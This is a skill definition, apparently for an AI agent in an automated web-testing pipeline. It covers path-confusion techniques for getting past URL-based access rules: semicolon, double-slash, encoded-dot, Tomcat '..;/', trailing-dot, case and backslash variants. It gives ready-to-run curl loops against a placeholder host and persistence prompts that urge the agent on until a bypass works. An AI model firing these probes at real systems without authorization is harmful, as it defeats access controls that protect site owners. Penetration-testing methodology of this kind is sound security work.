---
name: path_confusion
agent: agent3_endpoints
description: Routing/ACL confusion — semicolon params, double slashes, encoded dots, trailing dots, alias-twin differentials that slip past path-based rules.
---

# Path Confusion

## Purpose

Access-control rules are usually string matches on the URL path — and URL parsers disagree about what a path means. The WAF normalizes one way, the framework another; the reverse proxy strips what the app re-adds. Semicolons (`/admin/;x=1`), double slashes, encoded dots (`%2e`), trailing dots, and case tricks exploit these disagreements to make a denied path look like an allowed one to the gate while looking like the real path to the app. This skill systematically fires confusion variants at gated paths and claims success only on the same denied→non-error bar as the header battery, with alias-twin differentials recorded as findings in their own right.

## Division of labor

- **Consumes:** `endpoints/gated_paths.txt` (401/403 paths); alias-twin divergences flagged by `recursive_fuzz_loop`; the fingerprinted server/proxy stack (nginx, Apache, IIS, Tomcat, Spring — each has its own confusion quirks).
- **Produces:** the finished artifact — `findings/path_confusion.md` with one section per path: variant→response table, twin-differential notes, verdicts, raw pairs for successes.

## When to use / when NOT to use

- **Use when:** any path returns 401/403; alias twins diverged during fuzzing; the stack is nginx/Apache/IIS/Tomcat/Spring (all have documented parser quirks); a WAF visibly blocks by path pattern.
- **Skip when (time-pass filter):** the gate is a uniform edge-WAF block identical on dead paths (confusion won't reach the app — one variant sample to confirm, then document); the app is a pure static file server with no routing logic (no parser to confuse).

## Methodology

1. **Record the denied baseline** for each gated path (status, headers, body hash) — same bar as the header battery. Also record the baseline 404 (dead path) for comparison.
2. **Fire the semicolon group** (Spring matrix params, Tomcat, some WAFs strip at `;`):
   - `/<path>/;`
   - `/<path>;`
   - `/<path>/;x=1`
   - `/<path>;x=1/`
   - `/<path>;.css` and `/<path>/;.js` (extension-spoof: ACL regexes matching `\.css$` skip the rule)
   - `/;/<path>` (leading empty segment — some routers normalize, ACLs don't)
3. **Fire the slash group** (nginx `merge_slashes`, proxy normalization):
   - `//<path>` (double leading slash)
   - `/<path>//` (double trailing slash)
   - `//<path>//`
   - `/./<path>` and `/<path>/./`
   - `/<path>//<sub>` style for nested paths (double slash between segments)
4. **Fire the dot-encoding group** (per segment, only where the path contains dots or `..` is meaningful):
   - `%2e` for each `.` in turn (first only, then all)
   - `%252e` (double-encoded — proxy decodes once, app decodes twice)
   - `%c0%ae` (overlong UTF-8 — legacy Tomcat/IIS)
   - `%u002e` (Unicode encoding — IIS)
   - `..;/` (Tomcat normalize bypass — the classic)
   - `/%2e%2e/` traversal probes stay OUT of scope unless a file-read lead already exists; this skill is about gate confusion, not traversal exploitation.
5. **Fire the trailing-character group** (IIS and Windows stacks especially):
   - `/<path>.` (trailing dot — IIS strips, ACL doesn't match)
   - `/<path>/.` and `/<path>/..`
   - `/<path>%20`, `/<path>%09` (trailing space/tab)
   - Case variants: `/<PATH>`, `/<Path>`, `/ADMIN` (Windows/IIS case-insensitive, ACLs often case-sensitive)
   - `/<path>.json`, `/<path>.html` (extension appended — some routers ignore, ACLs match exact path)
6. **Fire the backslash group** (IIS/Windows): `/<path>\`, `\<path>`, `/<path>\..` — one quick pass; if the stack isn't Windows/IIS-evidenced, note and skip.
7. **Judge against the bar.** SUCCESS = denied (401/403) → non-error (200/302-to-app/500-with-content) AND differs from both the denied baseline and the dead-path 404. Record near-misses too: 403→403 with a different body (WAF vs app block — tells you which layer gates), 403→404 where the 404 body is the app's 404 (gate bypassed, path wrong — try the variant on sibling paths).
8. **Alias-twin differential pass.** For every VALID (non-gated) path, request the twin set (`/p`, `/p/`, `//p`, `/./p`, `/p/.`). Divergences (status or body differs between twins) are recorded as findings: they prove parser disagreement on this host, which justifies deeper confusion on gated paths and is independently useful for cache-deception leads.
9. **Re-verify successes 2x**, 30s apart, exact same variant string. Parser quirks can be order/load-dependent — 2/3 stable to CONFIRMED.
10. **Chain.** A confused-open path goes to `recursive_fuzz_loop` (fuzz beneath it), `param_mining`, `method_verb_matrix` — same as a header bypass. A twin divergence on a valid path goes to cache-behavior notes for downstream agents.
11. **Write the report**: per-path variant→response tables, twin differentials, verdicts, raw pairs for successes.

Decision branches: variant returns app-level 404 (differs from edge 404) → gate bypassed but path mangled: try the variant family on sibling paths · twins diverge on valid paths → parser disagreement confirmed: escalate confusion on all gated paths · all variants return identical denied baseline → document NEGATIVE per path · stack is nginx → prioritize slash group; IIS → prioritize trailing-dot/case group; Tomcat/Spring → prioritize semicolon group.

## Exact commands

Semicolon group:
```bash
P="<GATED_PATH>"
for v in "$P/" "$P;" "$P/;x=1" "$P;x=1/" "$P;.css" "$P/;.js" "/;${P#/}"; do
  code=$(curl -sS -o /tmp/pc_body -w '%{http_code} %{size_download}' --max-time 15 "https://<HOST>$v")
  echo "$code  $v"
done
```

Slash group:
```bash
P="<GATED_PATH>"
for v in "/${P#/}" "/${P#/}/" "//${P#/}//" "/./${P#/}" "${P}/./"; do
  code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "https://<HOST>$v")
  echo "$code  $v"
done
```

Dot-encoding group (Tomcat/Spring focus):
```bash
# ..;/ classic and encodings — gate-confusion only, not traversal exploitation
for v in "/..;/" "/%2e%2e/" "/%252e%252e/" "/%c0%ae%c0%ae/"; do
  echo "$v -> $(curl -sS -o /dev/null -w '%{http_code} %{size_download}' --max-time 15 "https://<HOST>$v")"
done
P="<GATED_PATH>"
echo "pct2e -> $(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "https://<HOST>${P//./%2e}")"
```

Trailing-character + case group:
```bash
P="<GATED_PATH>"
for v in "$P." "$P/." "$P%20" "$P%09" "$P.json" "${P^^}" "$(echo $P | sed 's/.*/\L&/;s/\b./\U&/g')"; do
  code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "https://<HOST>$v")
  echo "$code  $v"
done
```

Alias-twin differential pass (valid paths):
```bash
while read -r _ _ path; do
  echo "== $path =="
  for v in "$path" "$path/" "/${path#/}" "/./${path#/}" "$path/."; do
    code=$(curl -sS -o /tmp/tw -w '%{http_code} %{size_download}' --max-time 15 "https://<HOST>$v")
    h=$(sha256sum /tmp/tw | cut -c1-8)
    echo "  $code h=$h  $v"
  done
done < endpoints/recursive_fuzz_loop_valid.txt
```

Success re-verification:
```bash
for i in 1 2; do
  curl -sS -D /tmp/pcv_hdr -o /tmp/pcv_body -w 'HTTP %{http_code} len=%{size_download}\n' \
    --max-time 15 "https://<HOST><WINNING_VARIANT>"
  sha256sum /tmp/pcv_body
  sleep 30
done
```

## Completion-bias defenses

- [ ] Denied baseline + dead-path 404 recorded per gated path
- [ ] Semicolon group fired (6+ variants incl. extension-spoof)
- [ ] Slash group fired (5+ variants)
- [ ] Dot-encoding group fired (stack-appropriate subset)
- [ ] Trailing-character + case group fired
- [ ] Backslash group attempted or skipped with stack justification
- [ ] Every variant judged against the denied→non-error bar (near-misses noted, not claimed)
- [ ] Alias-twin differential pass run on all VALID paths; divergences recorded
- [ ] Successes re-verified 2x, 30s apart
- [ ] Confused-open paths chained to fuzz / param / verb skills
- [ ] `findings/path_confusion.md` written with per-path tables and verdicts

- **Review step:** agent10_review must verify: (1) no 403→404 is claimed as success; (2) near-misses are labeled as such; (3) the stack-justification exists for skipped groups; (4) successes have raw pairs and re-verification hashes.
- **Nudge prompts:**
  - "The WAF and the app are two different parsers. Your job is to find the string they disagree on — test every variant family, not just the famous ones."
  - "A 403 that becomes the app's own 404 means you beat the gate but mangled the path — that's progress, not failure. Try the variant family on sibling paths."
  - "Twin divergences on valid paths are findings, not trivia — they prove parser disagreement on this host."
- **Finished artifact definition:** `findings/path_confusion.md` on disk with per-path variant→response tables, twin-differential notes, verdicts per variant, and raw request/response pairs for every success.

## Evidence standard

- Baseline: denied baseline (2x) + dead-path 404 per path, same host, same run.
- Reproduction: winning variant re-fired 2x, 30s apart — 2/3 stable to CONFIRMED.
- Raw evidence: exact variant string + full response headers + first 2KB of body for baseline and success, side by side.
- Verdicts: CONFIRMED (denied→non-error, 2/3 stable, raw pairs) / INCONCLUSIVE (flips once or order-dependent) / NEGATIVE (all variants return the denied baseline — documented per path).

## Handoffs

- `recursive_fuzz_loop`: every confused-open path — new fuzz root beneath the gate.
- `param_mining` + `method_verb_matrix`: every confused-open path with dynamic content.
- `header_trick_battery`: paths where confusion changed the blocking layer (WAF→app) but didn't open — combine header + path tricks.
- Downstream cache-deception work: twin divergences (parser disagreement ⇒ cache-key confusion potential).
- `agent10_review`: the confusion report for the review gate above.
